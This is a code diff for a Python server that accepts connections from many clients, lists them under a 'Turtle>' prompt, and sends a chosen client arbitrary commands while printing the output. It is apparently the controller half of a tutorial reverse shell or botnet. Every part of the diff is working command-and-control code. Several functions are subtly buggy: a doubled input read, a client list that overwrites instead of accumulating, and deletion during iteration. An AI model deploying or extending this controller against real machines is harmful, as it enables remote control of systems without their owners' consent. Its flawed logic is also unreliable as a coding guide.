@@ -1,8 +1,14 @@
 import socket
 import sys
-
+import time
+from queue import Queue
+import threading
 #create a socket
-
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_addresses = []
 def create_socket():
     # try and except are like functions; they'll be active when s=socket.socket() isn't working
     try:
@@ -35,44 +41,99 @@ def bind_socket():
         print("Socket binding error: " + str(msg) + "\nRetrying...")
         bind_socket()
 
-# Establish a connection with a client (socket must be listening)
+#Handling connection from multiple clients and saving to a list
+#closing previous connection when serve.py file is restarted
+def accepting_connections():
+    for c in all_connections:
+        c.close()
+    del all_connections[:]
+    del all_addresses[:]
 
-def socket_accept():
-    # this will list the ip and port
-    conn, adress = s.accept()
+    while True:
+        try:
+            # accept connections from outside
+            conn, address = s.accept()
+            s.setblocking(1)  # prevent timeout
+            all_connections.append(conn)
+            all_addresses.append(address)
 
-    # ip address will be in strings but the port will be an integer, so we need to convert it into an integer
-    print("Connection has been established! |" + "IP: " + adress[0] + "| Port: " + str(adress[1]))
-    send_commands(conn)
-    conn.close()
-
-# Send commands to the client (infinite while loop is created so that the command does not stop after one command)
+            print("Connection has been established: " + address[0] + ":" + str(address[1]))
+        except:
+            print("Error accepting connections")
+#2nd thread funcition -1) see all the clients 2) select a client 3) send commands to connected client
+#Interactive prompt for sending commands
+def start_turtle():
+    while True:
+        cmd = input ("Turtle> ")
+        if cmd == "list":
+            list_connections()
+        elif "select" in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_commands(conn)
+        else:
+            print("Command not recognized.")
+        cmd = input("Turtle> ")
+#display all current active connections with the client
+def list_connections():
+    results = ""
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(" "))
+            conn.recv(20480)
+        except:
+            del all_connections[i]
+            del all_addresses[i]
+            continue
+        results = str(i) + "  " + str(all_addresses[i][0]) + ":" + str(all_addresses[i][1]) + "\n"
+    print("-----Clients-----" + "\n" + results)
+    print("Total connections: " + str(len(all_connections)))
+#select a client
+def get_target(cmd):
+    try:
+        target = cmd.replace("select ", "")
+        target = int(target)
+        conn = all_connections[target]
+        print("You are now connected to :" + str(all_addresses[target][0]))
+        print(str(all_addresses[target][0]) + "> ", end="")
+        return conn
+    except:
+        print("Selection not valid.")
+        return None
+#send commands to the connected client
 def send_commands(conn):
     while True:
-        # cmd is just a variable that will tell us to input; it'll only close if it's told to quit
-        # sys.exit will close the terminal
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-
-        # when sending commands from one computer to another, it will be sent using bits
-        # so first, we have to encode the file format
-        # and "len" is to know if the user typed a "str" > 0
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-
-            # the data that is received from the client is in bits form, so we need to convert it into a string
-            # utf-8 is the encoding type which is string
-            # end="" will let us move to the next line
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
-
-# send_commands is getting called on socket_accept
-def main():
-    create_socket()
-    bind_socket()
-    socket_accept()
-
-main()
+        try:
+            cmd = input()
+            if cmd == "quit":
+                break
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response, end="")
+        except:
+            print("Error sending commands.")
+            break
+#Threading
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start() 
+def work(): #do next job in the queue (create socket, bind socket, accepting connections)
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            accepting_connections()
+        if x == 2:
+            start_turtle()
+        queue.task_done()
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+create_workers()
+create_jobs()
+ 
